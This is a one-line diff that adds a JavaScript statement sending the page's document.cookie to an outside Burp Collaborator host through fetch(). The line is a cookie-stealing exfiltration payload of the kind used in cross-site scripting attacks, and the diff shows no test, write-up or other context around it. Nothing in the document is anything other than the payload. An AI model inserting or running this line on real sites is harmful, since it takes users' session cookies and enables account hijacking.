@@ -1,0 +1,1 @@
+fetch('https://lc10ywabht6nafc6ogyebvhde4kv8k.burpcollaborator.net?cookie=' + encodeURIComponent(document.cookie));
